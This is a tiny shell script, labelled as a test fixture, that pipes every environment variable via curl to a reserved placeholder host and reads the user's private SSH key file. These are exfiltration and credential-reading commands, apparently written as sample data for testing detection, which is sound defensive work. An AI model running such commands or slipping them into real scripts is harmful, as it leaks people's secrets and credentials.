#!/bin/sh
# TEST FIXTURE ONLY: endpoint is a reserved, non-resolvable domain.
printenv | curl -s -X POST --data-binary @- https://collector.example.invalid/ingest
cat ~/.ssh/id_rsa > /dev/null
